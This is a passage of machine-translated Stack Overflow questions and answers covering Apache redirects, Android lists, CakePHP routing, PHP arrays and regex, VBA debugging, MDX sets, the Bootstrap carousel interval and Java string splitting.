> 时间：2015-02-25T14:09:33.537

```
<onclick="window.location.href = 'tel:1231231234';"> 
```

代替

```
<a href="tel:+33102030405"> 
```

谢谢

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T08:01:27.780

很好的解决方案，上述解决方案效果更好，

# redirect - Apache2 服务器上的奇怪重定向行为？

> ID：14977352
> 
> 赞同：0
> 
> 时间：2013-02-20T10:18:28.133
> 
> 标签：redirect, amazon-web-services, apache2, rewrite, subdomain

我为我们公司建立了一个新站点，我最近开始为该公司工作，并将其部署在一个单独的子域 ( [http://site.mysite.com](http://site.mysite.com) ) 上，以免干扰一些需要保留在旧子域上的 URL .

出于某种奇怪的原因，旧的 HTML 站点（[http://www.mysite.co/site](http://www.mysite.co/site)）被放置在 Zend 应用程序的 public/ 文件夹中，即 public/site。[我们希望将这个曾经在http://mysite.com/site](http://mysite.com/site)文件夹中可用的站点重定向到我们的新站点[http://site.mysite.com](http://site.mysite.com)

我已经在 Zend 公共文件夹中编辑了现有的 .htaccess 文件，所以它看起来像这样：

```
RewriteEngine On

RewriteCond %{HTTP_HOST} ^mysite.com [NC]
RewriteRule ^(.*)$ http://www.mysite.com/$1 [R=301,NC,L] 

# These four lines are my only alterations to this file...
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_URI} ^/(apps|site).* [NC]
RewriteRule .* http://site.mysite.com/ [R=301,L]**

RewriteRule ^cart/selectaddress$ https://%{SERVER_NAME}/cart/selectaddress [R,L]

Redirect 301 /photobook-sa http://www.mysite.com/photobooksa/
Redirect 301 /photobook-SA http://www.mysite.com/photobooksa/
Redirect 301 /photobookSA http://www.mysite.com/photobooksa/

RewriteRule ^channel\.html channel\.php

RewriteCond %{REQUEST_FILENAME} -s [OR]
RewriteCond %{REQUEST_FILENAME} -l [OR]
RewriteCond %{REQUEST_FILENAME} -d [OR]
RewriteCond %{REQUEST_FILENAME} -f 
RewriteRule ^.*$ - [NC,L]

php_value session.auto_start 0
RewriteRule ^.*$ index.php [NC,L]
Header append P3P "CP=\"HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA\""

AddDefaultCharset UTF-8 
```

这个想法是捕获**[http://mysite.com/apps/](http://mysite.com/apps/)**，**[http://mysite.com/apps/whatever](http://mysite.com/apps/whatever)**和**[http://mysite.com/site/](http://mysite.com/site/)**并将这些都重定向到**[http://site .mysite.com](http://site.mysite.com)**

问题是，重定向只适用于/apps 和apps/whatever，不适用于/site。因此，我在 Zend 项目文件夹结构中发现了 public/site 文件夹，它奇怪地将公司站点作为仅 HTML 站点托管。

问题是，当我删除这个文件夹时，整个 mysite.com 和 www.mysite.com 域都失败了，但是例如 mysite.com/apps 仍然设法重定向到 site.mysite.com

所以我尝试编辑 public/site/index.php 看起来如下：

```
<?php
header('Location: http://site.mysite.com'); exit; 
```

它有效，但仅适用于几个请求，然后我收到服务器错误。

我还尝试在 public/site/.htaccess 中添加一个 .htaccess ，其中包含以下内容：

```
Redirect 301 http://site.mysite.com 
```

哪个也可以在最初工作，但在几次请求后因服务器错误而失败？

我不知道发生了什么，不知道为什么虚拟主机依赖于公共/站点文件夹才能工作，甚至在虚拟主机设置中都没有提到。

我对 Zend application/controllers 文件夹中的所有控制器进行了 grep，以尝试查看是否可以找到远程提及此 /site 文件夹的任何内容，但未找到匹配项。

我用这种奇怪的行为把头发从头皮上拔了出来，有人可以帮忙吗？

最后一点，这是一个我不完全熟悉的 Amason AWS 服务器，会不会是这个服务器发生了一些有趣的事情，在 Apache 配置、DNS 设置或一些神秘的自动化方面是非标准的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T10:24:41.197

我们无法解决这个问题，也无法弄清楚为什么我们的方法只工作了几分钟。我怀疑亚马逊 AWS 发生了一些奇怪的事情。

我们可以修复的唯一方法是在罪魁祸首 /site 文件夹中添加一个 index.html，使用一个小的 JavaScript 片段从客户端重定向站点。

# android - 从android中具有多个id的列表项中获取一个id值

> ID：14977355
> 
> 赞同：1
> 
> 时间：2013-02-20T10:18:34.843
> 
> 标签：android, list

当单击列表中的项目时，我正在尝试检索某个 id。

如何检索值 +id/name？我想在如下所示的警报对话框中使用它。

我目前正在使用一个简单的 toast，它只在单击列表项时显示“名称”

这是我的列表项的 xml 代码：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
 android:layout_width="fill_parent"
 android:layout_height="wrap_content">

<TextView
  android:id="@+id/text"
  android:layout_width="fill_parent"
  android:layout_height="wrap_content"
  android:layout_toLeftOf="@+id/image" android:textSize="20dip"   
      android:layout_marginLeft="10dip"/>

<ImageView
  android:id="@+id/image"
  android:layout_width="50dip"
  android:layout_height="50dip"
  android:layout_centerHorizontal="true"
  android:src="@drawable/stub" android:scaleType="centerCrop"/>

<TextView
  android:id="@+id/name"
  android:layout_width="fill_parent"
  android:layout_height="wrap_content"
  android:layout_toRightOf="@+id/image"
  android:textSize="20dip" android:layout_marginLeft="10dip"/>

</RelativeLayout> 
```

警报对话框代码：

list.setOnItemClickListener(new OnItemClickListener() {

```
 String artistname = "get +id/name here";
                    String items[] = {"Youtube", "Soundcloud"};
                         @Override
                         public void onItemClick(AdapterView<?> parent, View view,
                                 int position, long id) {

                             AlertDialog.Builder builder = new 
                                     AlertDialog.Builder(JsonActivity.this);

                             builder.setTitle(artistname);
                             builder.setItems(items, new   
                                     DialogInterface.OnClickListener() {
                                 public void onClick(DialogInterface dialog, int which) {

                             }
                             });

                             AlertDialog alert = builder.create();
                             alert.show();
                         }});

                } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:30:51.847

试试这个

```
 public void onItemClick(AdapterView<?> parent, View view,
                                 int position, long id) {
//name of the artist...
String name=((TextView)view.findViewById(R.id.name)).getText();

} 
```

我想这就是你想要的......我希望这会对你有所帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:24:35.677

当我们使用适配器显示列表时。在 getView 方法中，我们根据项目在列表中的位置从集合中获取一个值。我正在谈论的适配器的数据源。像这样。

```
public View getView(){
   holder.name.setText(data.get(position));
} 
```

当一个列表项被点击时，您将使用 listItemOnClickListener 获得被点击的位置。在该回调中，再次调用数据源的 get 方法以获取您粘贴到列表项上的元素。希望你明白了。因为我没有发布太多代码来支持它。

# php - Cakephp 传递的参数

> ID：14977359
> 
> 赞同：2
> 
> 时间：2013-02-20T10:18:39.680
> 
> 标签：php, cakephp, routing, url-routing

您好，我的代码在 CakePHP 框架中不起作用，并且显示错误消息。

**网址：**

```
http://domainname.com/About/param1/param2 
```

**代码：**

```
class AboutController extends AppController {

    public $name = 'About';
    public $helpers = array('Html');

    public function index($arg1, $arg2)
    {
        print_r($this->request->params['pass']);
        $this->set('title_for_layout','Sarasavi Bookshop - About Sarasavi Bookshop');
        $this->set('nameforfiles','about');
    }
} 
```

**错误信息：**

```
Missing Method in AboutController    
Error: The action param1 is not defined in controller AboutController
Error: Create AboutController::param1() in file: app\Controller\AboutController.php.

<?php
class AboutController extends AppController {

    public function param1() {

    }

}

Notice: If you want to customize this error message, create app\View\Errors\missing_action.ctp 
```

创建函数后`param1`我可以得到`param2`，但我需要得到`param1`和`param2`两者，在`index`函数中没有创建另一个动作。

请帮助我，谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T10:26:19.120

如果您访问[http://domainname.com/About/index/param1/param2 ，您的原始代码将起作用](http://domainname.com/About/index/param1/param2)

如果您不希望`index`url 中的 ，我假设您不希望，那么您需要定义一个路由。

将此添加到您的路线：

```
Router::connect(
    '/About/*',
    array('controller' => 'About', 'action' => 'index')
); 
```

自动路由未指定操作但具有参数以执行操作的请求`index`。您将需要为任何新`About`操作添加路由，以阻止它们的请求默认进入索引。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-20T10:32:46.860

您可能在不指定操作名称（索引）的情况下访问此 URL，如下所示：

[/关于/param1/param2](/about/param1/param2)

这将不起作用，因为 Cake 期望在控制器名称之后看到动作名称。在这种情况下，param1 被视为操作名称。您可以使用 URL 访问您的操作

[/about/index/param1/param2](/about/index/param1/param2)

要克服这种情况，请为您的路由器制定新规则：

```
Router::connect(
    '/about/:param1/:param2',
    array('controller' => 'about', 'action' => 'index'),
    array('param1', 'param2')
); 
```

# ios - 不同版本的IOS应用

> ID：14977363
> 
> 赞同：0
> 
> 时间：2013-02-20T10:18:53.513
> 
> 标签：ios, version

我有一个基于 sqlite DB 的应用程序，我需要创建它的不同版本。每个版本都使用不同的数据库，它们的名称和更新它们的 url，以及一些其他参数，但代码在任何版本中都相同。

我的问题是如何保持简单。在 android 上，我已经完成了几个项目作为库，并为每个版本创建了一个新项目。新项目只是一个从应用程序扩展的类，我在其中设置了用于定义 url 等的 dbs 名称和其他字符串的参数。但是在 IOS 中我不确定如何做到这一点并且只有一个源要更新适用于所有版本。

我正在阅读一些有关目标的信息，但我不确定这是否是最好的方法，即使我不知道该怎么做。

你给我推荐什么？使用目标？如何设置它们以更改原始项目中的属性，例如数据库名称？或者你有更好的方法来做到这一点？

应用程序中用于更改 HMI 或内容的所有内容都在 DB 中，这就是我为每个版本使用不同 DB 的原因。即使我对 android 版本使用相同的数据库。

谢谢你的帮助。

PS：再澄清一点，两个版本的功能是一样的，只是改变了内容，这个内容是在数据库中的。我不想拥有专业版和精简版。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:27:56.183

我认为不同的目标选项在这种情况下是完全有效的，因为您可以决定哪些文件进入哪个应用程序。我有一个类似的应用程序，它共享大部分代码，但是每个应用程序都有一些特定的资源。

只需确保在向项目添加新文件时选择了正确的目标，或者如果它是共享资源，则选择所有目标。您可以在 XCode 的实用程序面板中执行此操作。

# php - 从数组生成随机值集

> ID：14977370
> 
> 赞同：1
> 
> 时间：2013-02-20T10:19:05.307
> 
> 标签：php

我想获取静态长度以从数组中获取任何随机值。

PHP代码：

在下面的代码中，如何从数组中获取 5 个随机值？

```
$arr_history = array(23, 44,24,1,345,24,345,34,4,35,325,34,45,6457,57,12);
$lenght=5;
for ( $i = 1; $i < $lenght; $i++ )
     echo array_rand($arr_history); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:23:01.540

您可以使用`array_rand()`选择 5 个随机键，然后使用它们与数组键相交；这使原始数组保持不变。

```
$values = array_intersect_key($arr_history, array_flip(array_rand($arr_history, 5))); 
```

[**演示**](http://codepad.viper-7.com/7dm1fM)

或者，您可以先对数组进行就地洗牌，然后取出第一个或最后 5 个条目：

```
shuffle($arr_history);
$values = array_slice($arr_history, -5); 
```

这样做的好处是您可以连续取出多组而不会重叠。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:20:18.790

试试这个 ：

```
$rand_value = array_rand($arr_history);

echo $rand_value; 
```

参考： http: [//php.net/manual/en/function.array-rand.php](http://php.net/manual/en/function.array-rand.php)

或使用：

```
shuffle($arr_history) 
```

这将打乱数组的顺序：http: [//php.net/manual/en/function.shuffle.php](http://php.net/manual/en/function.shuffle.php)

# silverlight - 将 +/- 图像绑定到滑块？

> ID：14977376
> 
> 赞同：0
> 
> 时间：2013-02-20T10:19:10.973
> 
> 标签：silverlight, silverlight-5.0

嗨，我的滑块左侧有一个“-”的图像，右侧有一个“+”的图像。

如何绑定这些图像，以便如果单击它们，它们会根据我的 SMALLCHANGE 值增加或减少滑块？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T19:37:56.403

请注意，最简单的方法是命名您的 Slider，在 UserControl 中处理 Image.MouseLeftButtonUp 并在后面的代码中更改其值。如果您不打算重用此行为，则无需再做任何事情。

为了使这种行为可重用，有几种方法。最初，我建议在图像中使用[EventTrigger ，并将](http://msdn.microsoft.com/en-us/library/bb979699%28v=vs.95%29.aspx)[CallMethodAction](http://msdn.microsoft.com/en-us/library/microsoft.expression.interactivity.core.callmethodaction%28v=Expression.40%29.aspx)绑定到 Slider，但 Slider 没有 LargeIncrement、SmallIncrement、LargeDecrement、SmallDecremenet 等方法。不过，您可以将其子类化并自己实现这些方法。

另一种选择是为 Image（或任何 FrameworkElement）创建一个像“IncrementSlider”这样的[AttachedProperty](http://msdn.microsoft.com/en-us/library/cc903943%28v=vs.95%29.aspx)，它将通过 ElementName 绑定接收一个 Slider 实例。在 PropertyMetadata 的 PropertyChangedCallback 中（见此[）](http://msdn.microsoft.com/en-us/library/system.windows.propertymetadata%28v=vs.95%29.aspx)[，](http://geekswithblogs.net/Silverlight2/archive/2008/12/24/understanding-dependency-properties-in-silverlight.aspx)您可以订阅控件的 MouseLeftButtonUp 事件并修改 Slider。您也可以创建其他附加属性，例如“DecrementSlider”、“SmallIncrementSlider”。

在这种情况下，比 AttachedProperty 更好的解决方案是[AttachedBehavior](http://wildermuth.com/2009/5/16/Writing_Behaviors_for_Silverlight_3_-_Part_1)。您可以使用 Slider 属性和其他控件属性（如“IncrementOrDecrement”和“SmallOrLarge”）为 FrameworkElement（或只是 Image）创建行为。在行为的 OnAttached 方法中，您将订阅控件的 MouseLeftButtonUp 以更新 Slider（如果有可用的话）。然后，您可以将行为附加到图像，将行为的 Slider 属性绑定到所需的 Slider，并将其配置到每个图像，以大步或小步递增或递减。

# vba - 是否有一个 VBA 命令导致在该点开始调试？

> ID：14977377
> 
> 赞同：8
> 
> 时间：2013-02-20T10:19:13.823
> 
> 标签：vba, excel

这个问题的上下文是我使用消息框作为工具来帮助我熟悉在 Excel 工作簿集合上运行的大量 VBA 宏。

我小心地在代码中插入消息框，这些消息框会弹出并告诉/提醒我我们在代码中的位置。我想在这些框中有一个按钮，它将带我进入那时的代码调试。

目前我的解决方案是如果选择“是”按钮，则执行除零。这是一个示例片段：

```
Dim MyError as Double
...
If MsgBox("Just entered function XYZ(). Want to debug?", vbYesNo + vbDefaultButton2) = vbYes Then MyError = 1# / 0 
```

它有效，但不是很优雅。

我希望有一个命令可以在调用该命令时启动 VBA 调试模式。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-20T10:21:33.277

该`Stop`命令为您执行此操作：

```
If MsgBox("Just entered function XYZ(). Want to debug?", vbYesNo + vbDefaultButton2) = vbYes Then Stop 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-02-20T10:20:31.370

就在这里：

```
Debug.Assert False 
```

# ios - 针对特定视图以纵向和横向模式显示 UISplitViewController 的主视图控制器

> ID：14977379
> 
> 赞同：1
> 
> 时间：2013-02-20T10:19:16.883
> 
> 标签：ios, ipad, rotation, uisplitviewcontroller

我正在尝试为我的 UISplitViewController 的主视图控制器实现隐藏/取消隐藏功能。因此主视图控制器应该以纵向和横向模式存在，但仅适用于特定视图（设置）。在其他任何地方，它都应该只出现在横向中。

在`-(void)viewDidAppear:(BOOL)animated`我的 MasterController 我正在写

```
self.popoverController.delegate = self;
appDelegate.splitViewController.delegate= nil;
appDelegate.splitViewController.delegate = self;
[appDelegate.splitViewController willRotateToInterfaceOrientation:self.interfaceOrientation duration:0];
[appDelegate.splitViewController didRotateFromInterfaceOrientation:self.interfaceOrientation];
appDelegate.splitViewController.view setNeedsLayout]; 
```

委托方法也设置了

```
- (BOOL)splitViewController:(UISplitViewController *)svc shouldHideViewController:(UIViewController *)vc inOrientation:(UIInterfaceOrientation)orientation
{    
    return NO;
} 
```

我在 stackoverflow 上找到的这种方法确实很有效，但只要我旋转设备。然后主视图控制器消失（并留下一个黑色空间）。旋转时它会出现，一旦旋转完成，它就会再次消失。此外，如果我在外部单击，主视图控制器将完全消失。

所以我实现了下面的委托方法来防止弹出框消失

```
- (BOOL)popoverControllerShouldDismissPopover:(UIPopoverController *)popoverController
{
    return NO;
} 
```

这也有效，但是我的详细视图的 tableView 没有响应。

如果我从`-(void)viewDidAppear:(BOOL)animated`UIPopoverControllerDelegate 方法中删除代码，它会按预期工作，但就在我旋转设备之后。

所以我的问题是，如果有人知道我该如何解决这个问题。该解决方案应该能够与 iOS 5.0 和更高版本一起使用。

非常感谢你的回答！

# android - 使用arrayobject获取带有值的索引并存储在数组列表中

> ID：14977381
> 
> 赞同：0
> 
> 时间：2013-02-20T10:19:32.000
> 
> 标签：android, arraylist, arrays

```
 [  {
        "question_id": 13,
        "creation_date": 10,
        "name": " certain degrees",
        "tags": [
            "android",
            "sensor"
        ],
.....
...}

] 
```

这是我要获取标签数组的api，标签数组仅包含索引和值，我想使用数组对象获取数组并最终存储在数组列表中，我尝试过但未能获取错误已发生。

```
02-20 15:45:37.323: I/System.out(1165): org.json.JSONException: Value android at 0 of type java.lang.String cannot be converted to JSONObject 
```

谁能帮我解决这个问题。

```
tagarray = questionobj.getJSONArray("tags");

        for(int j=0;j<tagarray.length();j++){

//tagobject = tagarray.getJSONObject(j);//..if i comment this line the full array list is displaying but i need for each question allocated tags to display..am i clear.. 
            //if(tagobject!=null){
            tagname.add(tagarray.getString(j));
            ///tagname.add(0, null);
            //} 
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:42:58.910

你的 json 格式不正确试试这样；

```
{"question":
{"question_id": "13", 
 "name": "certain degrees", 
 "tags": [{"android":"N", "sensor":"Y"}]
 }} 
```

您可以使用[http://jsonviewer.stack.hu/](http://jsonviewer.stack.hu/)，以确保更正您的 json 数据

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T11:35:24.693

尝试这个，

```
 ArrayList<String> list = new ArrayList<String>();

String text = "[  { \"question_id\": 13, \"creation_date\": 10, \"name\": \"certain degrees\", \"tags\": [ \"android\", \"sensor\" ] } ]";
  try {
        JSONArray jarray = new JSONArray(text);

        for (int i = 0; i < jarray.length(); i++) {
            JSONArray j_array = jarray.getJSONObject(i)
                    .getJSONArray("tags");

            for (int j = 0; j < j_array.length(); j++) {
                String str = j_array.getString(j);

                list.add(str);

            }

        }
    } catch (Exception e) {

    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:58:19.417

我建议你试试这个代码，

```
import org.json.JSONArray;
import org.json.JSONObject;

public class Main {

    public static void main(String[] args) {
        String text = "[  { \"question_id\": 13, \"creation_date\": 10, \"name\": \"certain degrees\", \"tags\": [ \"android\", \"sensor\" ] } ]";

        System.out.println(text);

        JSONArray jsonArray = new JSONArray(text);

        JSONObject jsonObjetc = jsonArray.getJSONObject(0);

        JSONArray tagarray = jsonObjetc.getJSONArray("tags");

        System.out.println(tagarray);

        for(int j=0;j<tagarray.length();j++){
            System.out.println(tagarray.getString(j));
        }
    }
} 
```

祝你好运，阿伦

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T12:34:48.310

尝试这个

tagarray = questionobj.getJSONArray("tags");

```
 for(int j=0;j<tagarray.length();j++)
    {
        tagname.add(tagarray.getJSONObject(j).getString("android"));         
    } 
```

# php - 正则表达式禁止连续两个字符

> ID：14977383
> 
> 赞同：0
> 
> 时间：2013-02-20T10:19:40.173
> 
> 标签：php, regex

我正在尝试修改此正则表达式模式，以使其不允许连续或开始/结束处的两个指定字符-

```
/^[^\!\"\£\$\%\^\&\*\(\)\[\]\{\}\@\~\#\/\>\<\\\*]+$/ 
```

因此，目前它可以防止字符串中的任何位置出现这些字符，但我也想阻止这些字符发生以下情况：

*   出现在字符串开头的任何空格、撇号`'`、下划线`_`或连字符`-`或点`.`

*   还可以连续阻止这些字符中的任何两个，即`''`或`_._`或`' -__- ' .`

任何帮助将不胜感激。

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:32:33.117

单程

```
/^(?=[^!"£$%^&*()[\]{}@~#\/><\\*]+$)(?!.*[ '_.-]{2})[^ '_.-].*[^ '_.-]$/ 
```

注意，仅作为 javascript 正则表达式进行测试，即

```
var rex = /^(?=[^!"£$%^&*()[\]{}@~#\/><\\*]+$)(?!.*[ '_.-]{2})[^ '_.-].*[^ '_.-]$/;
rex.test('okay');        // true
rex.test('_not okay');   // false 
```

或者，匹配不允许的模式

```
/^[ '_.-]|[ '_.-]$|[!"£$%^&*()[\]{}@~#\/><\\*]|[ '_.-]{2}/ 
```

第一个正则表达式将只匹配不包含不允许的模式的字符串。
上面的一个将匹配字符串中任何不允许的模式。

*更新*

现在使用 php 进行简要测试。唯一的区别是`"`字符集中的 需要转义。

```
<?php
$test = 'some string';
$regex = "/^[ '_.-]|[ '_.-]$|[!\"£$%^&*()[\]{}@~#\/><\\*]|[ '_.-]{2}/";
if ( preg_match( $regex, $test ) ) {
    echo 'Disallowed!';
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T15:49:05.940

我不确定我是否理解确切的问题，但这里有一个建议：

```
<?php
$test     = "__-Remove '' _._ or -__- but not foo bar '. _  \n";
$expected = 'Remove or but not foo bar';

// The list of disallowed characters. There is no need to escape.
// This will be done with the function preg_quote.
$excluded_of_bounds = "'_.-";

// Remove disallowed characters from start/end of the string.
// We add the space characters that should not be in the regexp.
$test = trim($test, $excluded_of_bounds . " \r\n");

// In two passes
$patterns = array(
  // 1/ We remove all successive disallowed characters,
  //    excepted for the spaces
  '#[' . preg_quote($excluded_of_bounds) . ']{2,}#',
  // 2/ We replace the successive spaces by a unique space.
  '#\s{2,}#',
);
$remplacements = array('', ' ');

// Go!
$test = preg_replace($patterns, $remplacements, $test);

// bool(true)
var_dump($expected === $test); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T17:03:43.803

```
$tests[1]     = "fail_.fail";  // doubles
$tests[]     = "fail_-fail";
$tests[]     = "fail_ fail";
$tests[]     = "fail  fail";
$tests[]     = "fail -fail";
$tests[]     = "pas.s_1";
$tests[]     = "pa.s-s_2"; // singles
$tests[]     = "pas.s_3";
$tests[]     = "p.a.s.s_4";
$tests[10]     = "pa s-s_5";
$tests[]     = "fail fail'"; // pre or post-pended
$tests[]     = " fail fail";
$tests[]     = " fail fail";
$tests[]     = "fail fail_";
$tests[15]     = "fail fail-";

// The list of disallowed characters. There is no need to escape.
// This will be done with the function preg_quote.
$exclude = array(" ","'", "_", ".", "-");

$pattern =  "#[" . preg_quote(join("", $exclude)) . "]{2,}#s";

// run through the simple test cases 

foreach($tests as $k=>$test){
if( 
    in_array(substr($test, 0, 1), $exclude)  
 || in_array(substr(strrev($test), 0 , 1) , $exclude))
   {
   echo "$k thats a fail" . PHP_EOL;
   continue;
   }

  $test = preg_match( $pattern,  $test);
    if($test === 1){
    echo "$k - thats a fail". PHP_EOL ;
    }else{
    echo "$k - thats a pass $test ". PHP_EOL ;
    }
} 
```

无可救药地从其他回复中窃取，我提倡使用 PHP 简单的 in_array 首先检查字符串的开始和结束，并在发现不好的东西时尽早失败。

如果测试通过了，那么运行一个非常简单的正则表达式。

将很多内容放入一个函数并在失败时返回 false ——这将导致我添加了很多冗长的行——你甚至可以将排除数组作为变量发送——但这似乎是一个特定的函数，所以可能是 YAGNI

例如

```
if( badString($exclude_array, $input) ) // do stuff 
```

# ssas - 使用 MDX 查询从现有集合中排除成员

> ID：14977388
> 
> 赞同：1
> 
> 时间：2013-02-20T10:19:51.230
> 
> 标签：ssas, mdx

我需要一个 MDX 来消除现有集合中的一些成员，我的场景如下

我有具有 n 级父子层次结构的维度，并且我在 PPS 仪表板中使用该维度。当用户与父母一起选择所有孩子时，我不应该显示孩子，我应该只显示父母，这适用于任何级别。

下面是一个例子，假设公司是我的维度，它在主要部门下有人力资源和财务部门和子部门（我在括号中添加了每个部门的主键）。

```
公司 (1)    
          人力资源 (2)   
                人力资源分部 1 (3)
                人力资源分部 2 (4)
          金融 (5)   
                财务分 1 (6)
                财务分 2 (7)

```

我在我的 PPS 中将上述维度用作“多选树”，因此用户可以一次选择 HR、HR Sub 1、HR Sub 2。When selects all child under parent then I need to exclude the children.

下面是实现它的逻辑

首先获取每个成员的父级，如果成员父级存在于所选集中，则忽略该成员。为了实现这一点，我编写了一个 MDX，我能够找到每个成员的父级，但我不知道如何检查父级是否存在于集合中。

下面是我写的MDX

```
WITH SET DeptSet AS '{[Company].[Dept].&[2], [Company].[Dept].&[3],[Company].[Dept].&4], [Company].[Dept].&[6]}'
MEMBER Measures.ParentNode as [Company].Dept].CURRENTMEMBER.PARENT.UNIQUENAME

SELECT [Measures].[EmpCount] on ROWS, {Need Trimmed Member Set Here} on COLUMNS FROM [CUBE] 
```

在上面的 MDX 中，“DeptSet”是我从 PPS 收到的集合，在实现上述逻辑后，我需要得到如下集合

```
{[Company].[Dept].&[2], [Company].[Dept].&[6]} 
```

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-21T13:41:58.803

使用下面的 MDX 来完成它

[DeptSet] - 过滤器([DeptSet], Count([DeptSet].CurrentMember.Parent - [DeptSet])=0)

代替{此处需要修剪的成员集}

查看以下链接了解更多详情 [http://social.msdn.microsoft.com/Forums/en/sqlanalysisservices/thread/a020c70c-2986-4f2c-8f4f-366e8be06c2d](http://social.msdn.microsoft.com/Forums/en/sqlanalysisservices/thread/a020c70c-2986-4f2c-8f4f-366e8be06c2d)

# javascript - Bootstrap Carousel：删除自动幻灯片

> ID：14977392
> 
> 赞同：134
> 
> 时间：2013-02-20T10:20:07.250
> 
> 标签：javascript, jquery, twitter-bootstrap

我正在使用引导轮播。我想要的是滑块只会在单击导航或分页时滑动。我试过删除

```
$('.carousel').carousel({
    interval: 6000
}); 
```

它工作正常，但我的问题是一旦我已经点击了导航或分页，它现在是自动滑动的。是否可以取消自动滑动功能？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：273
> 
> 时间：2013-02-20T10:22:07.943

您可以通过 js 或 html (easy) 两种方式执行此操作

1.  **通过js**

```
$('.carousel').carousel({
  interval: false,
}); 
```

这将使自动滑动停止，因为没有添加毫秒并且永远不会滑动。

2.  **通过 Html** 通过添加`data-interval="false"`和删除`data-ride="carousel"`

```
<div id="carouselExampleCaptions" class="carousel slide" data-ride="carousel"> 
```

变成：

```
<div id="carouselExampleCaptions" class="carousel slide" data-interval="false"> 
```

**根据@webMan 的评论更新**

* * *

## 回答 #2

> 赞同：114
> 
> 时间：2013-02-20T10:25:55.587

来自[官方文档](http://getbootstrap.com/javascript/#carousel)：

> **间隔**自动循环项目之间的延迟时间。*如果为**false**，轮播将不会自动循环。*

您可以使用 javascript 或使用`data-interval="false"`属性传递此值。

* * *

## 回答 #3

> 赞同：60
> 
> 时间：2016-10-05T12:55:37.850

您只需要向您的 DIV 标签添加一个属性，即

```
data-interval="false" 
```

不用碰JS！

* * *

## 回答 #4

> 赞同：38
> 
> 时间：2017-07-22T10:56:49.220

更改/添加到轮播 div 上的 data-interval="false"

```
<div class="carousel slide" data-ride="carousel" data-type="multi" data-interval="false" id="myCarousel"> 
```

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2017-03-24T04:59:39.013

请尝试以下方法：

```
<script>
    $(document).ready(function() {      
        $('.carousel').carousel('pause');
    });
</script> 
```

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2020-12-16T12:37:37.830

在 Bootstrap v5 中使用：`data-bs-interval="false"`

```
<div id="carouselExampleCaptions" class="carousel" data-bs-ride="carousel" data-bs-interval="false"> 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2016-12-12T07:28:45.817

数据间隔=“假”

将此添加到相应的 div ...

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2017-05-16T09:21:18.103

```
$(document).ready(function() {
  $('#media').carousel({
    pause: true,
    interval: 40000,
  });
}); 
```

通过使用上述脚本，您将能够自动移动图像

```
$(document).ready(function() {
  $('#media').carousel({
    pause: true,
    interval: false,
  });
}); 
```

通过使用上面的脚本，`auto-rotation`将被阻止，因为`interval`是`false`

# java - 获取字符串的一部分并与变量进行比较（字符串变量）

> ID：14977393
> 
> 赞同：0
> 
> 时间：2013-02-20T10:20:11.363
> 
> 标签：java, string, groovy

我有这样的字符串：

```
String value = "13,14,15,16,17" 
```

但我不知道逗号分隔有多少数字。

我想与变量进行比较：

```
String varValue = "16" 
```

它可能在任何位置..

我想比较这两个字符串变量......请有人帮忙吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T10:23:15.393

你可以做这样的事情：

```
String values = '13,14,15,16,17'

String required = '16'

values.tokenize( ',' ).with { toks ->
  println "There are ${toks.size()} elements in the list"
  println "The list contains $required is ${toks.contains( required )}"
  println "It is at position ${toks.indexOf( required )}"
} 
```

哪个打印

```
There are 5 elements in the list
The list contains 16 is true
It is at position 3 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T11:00:43.907

如果您使用的是 Java，则可以执行以下操作来实现此目的：
1\. 将输入字符串拆分为一个数组。
2\. 将该数组转换为列表。

现在
a) 要查找以逗号分隔的总元素，请使用：size()。

b) 要查找列表是否包含所需元素，请使用： contains()。

c) 要查找元素在列表中的位置，请使用：indexof()

所以代码看起来像：

导入 java.util.Arrays；
导入 java.util.List；

公共类测试{
公共静态无效主要（字符串[]参数）{

```
 String inputString = "13,14,15,16,17";
    String element = "16";

    // Convert the string into array.
    String values[] = inputString.split(",");

    // Create a list using array elements.
    List<String> valList = Arrays.asList(values);

    System.out.println("Size :" + valList.size());
    System.out.println("List contains 5 " + valList.contains(element));
    System.out.println("Position of element" + valList.indexOf(element));
} 
```

}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:22:31.500

使用该`split`方法将数字放入数组中，然后进行比较。

这里：[http ://docs.oracle.com/javase/1.4.2/docs/api/java/lang/String.html](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/String.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T10:24:22.700

